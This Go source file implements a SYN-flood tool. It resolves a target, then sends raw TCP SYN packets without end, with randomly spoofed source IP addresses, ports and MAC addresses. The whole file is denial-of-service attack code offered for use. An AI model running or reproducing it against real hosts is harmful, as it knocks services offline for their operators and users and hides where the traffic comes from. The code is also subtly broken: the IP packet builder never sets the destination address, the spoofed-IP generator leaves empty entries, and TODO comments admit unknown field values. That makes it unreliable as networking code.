package synflood

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"time"

	"github.com/didof/swissknife/internal/logger"
	"github.com/didof/swissknife/internal/version"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/pkg/errors"
	progressbar "github.com/schollz/progressbar/v3"
	"go.uber.org/zap"
	"golang.org/x/net/ipv4"
)

var (
	log = logger.Get()
	ver = version.Get()
)

func Run(ctx context.Context, target string, opts SynFloodOptions) {
	if opts.Verbose {
		logger.SetLevel(zap.DebugLevel)
	}

	log.Info("synflood is started",
		zap.String("appVersion", ver.GitVersion),
		zap.String("goVersion", ver.GoVersion),
		zap.String("goOs", ver.GoOs),
		zap.String("goArch", ver.GoArch),
		zap.String("gitCommit", ver.GitCommit),
		zap.String("buildData", ver.BuildDate),
	)

	var timeoutCancel context.CancelFunc
	if opts.FloodDurationMilliseconds != -1 {
		ctx, timeoutCancel = context.WithTimeout(ctx, time.Millisecond*time.Duration(opts.FloodDurationMilliseconds))
	}

	go func() {
		if err := do(ctx, target, opts); err != nil {
			if timeoutCancel != nil {
				timeoutCancel()
			}

			log.Fatal("an error occured on flooding process", zap.String("error", err.Error()))
		}
	}()

	for {
		select {
		case <-ctx.Done():
			if timeoutCancel != nil {
				timeoutCancel()
			}
			return
		default:
			continue
		}
	}
}

var ErrDNSLookup = errors.New("dns lookup")

func do(ctx context.Context, host string, opts SynFloodOptions) error {
	rand.Seed(time.Now().Unix())

	dstIp, err := resolveHost(ctx, host)
	if errors.Is(err, ErrDNSLookup) {
		return errors.Wrap(err, "unable to resolve host")
	}

	description := fmt.Sprintf("Flood is in progress, target=%s:%d, payloadLength=%d",
		host, opts.Port, opts.PayloadLength)
	bar := progressbar.DefaultBytes(-1, description)

	ipsSpoofer := newIpsSpoofer(20)
	portsSpoofer := newPortsSpoofer()
	macAddrsSpoofer := newMacAddrsSpoofer(20)
	payload := newRandomPayload(20)

	serializeOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	for {
		select {
		case <-ctx.Done():
			return nil
		default:
			tcpPacket := createTcpPacket(portsSpoofer.rand(), opts.Port)
			ipPacket := createIpPacket(ipsSpoofer.rand(), dstIp)

			if err := tcpPacket.SetNetworkLayerForChecksum(ipPacket); err != nil {
				return err
			}

			ipHeaderBuf := gopacket.NewSerializeBuffer()

			if err := ipPacket.SerializeTo(ipHeaderBuf, serializeOpts); err != nil {
				return errors.Wrap(err, "unable to serialize")
			}

			ipHeader, err := ipv4.ParseHeader(ipHeaderBuf.Bytes())
			if err != nil {
				return errors.Wrap(err, "unable to parse IP header")
			}

			ethernetLayer := createEthernetPacket(macAddrsSpoofer.rand(), macAddrsSpoofer.rand())
			tcpPayloadBuf := gopacket.NewSerializeBuffer()
			pyl := gopacket.Payload(payload)

			if err := gopacket.SerializeLayers(tcpPayloadBuf, serializeOpts, ethernetLayer, tcpPacket, pyl); err != nil {
				return errors.Wrap(err, "unable to serialize layers")
			}

			// send
			packetConn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return errors.Wrap(err, "unable to listen packet on 0.0.0.0")
			}

			rawConn, err := ipv4.NewRawConn(packetConn)
			if err != nil {
				return errors.Wrap(err, "unable to create raw connection over 0.0.0.0")
			}

			if err := rawConn.WriteTo(ipHeader, tcpPayloadBuf.Bytes(), nil); err != nil {
				return err
			}

			if err := bar.Add(opts.PayloadLength); err != nil {
				return errors.Wrap(err, "unable to increase bar length")
			}
		}
	}
}

func resolveHost(ctx context.Context, input string) (net.IP, error) {
	if ip := net.ParseIP(input); ip != nil {
		log.Debug("already an IP address, skipping DNS resolution", zap.String("host", input))
		return ip, nil
	}

	ipRecords, err := net.DefaultResolver.LookupIP(ctx, "ip4", input)
	if err != nil {
		return nil, ErrDNSLookup
	}

	ip := ipRecords[0]
	log.Debug("DNS lookup succeeded", zap.String("DNS", input), zap.String("IP", ip.String()))

	return ip, nil
}

func generateSpoofedIps(n int) []net.IP {
	ips := make([]net.IP, n)
	getRand256 := func() int {
		return rand.Intn(256)
	}
	for i := 0; i < n; i++ {
		spoofIp := net.ParseIP(fmt.Sprintf("%d.%d.%d.%d", getRand256(), getRand256(), getRand256(), getRand256()))
		ips = append(ips, spoofIp)
	}
	return ips
}

func createTcpPacket(srcPort int, dstPort int) *layers.TCP {
	return &layers.TCP{
		SrcPort: layers.TCPPort(srcPort),
		DstPort: layers.TCPPort(dstPort),
		Window:  14600,      // TODO what is this?
		Seq:     1105024978, // TODO what is this?
		SYN:     true,
		ACK:     false,
	}
}

func createIpPacket(srcIp, dstIp net.IP) *layers.IPv4 {
	return &layers.IPv4{
		SrcIP: srcIp,
	}
}

func createEthernetPacket(srcMac, dstMac net.HardwareAddr) *layers.Ethernet {
	return &layers.Ethernet{
		SrcMAC: srcMac,
		DstMAC: dstMac,
	}
}
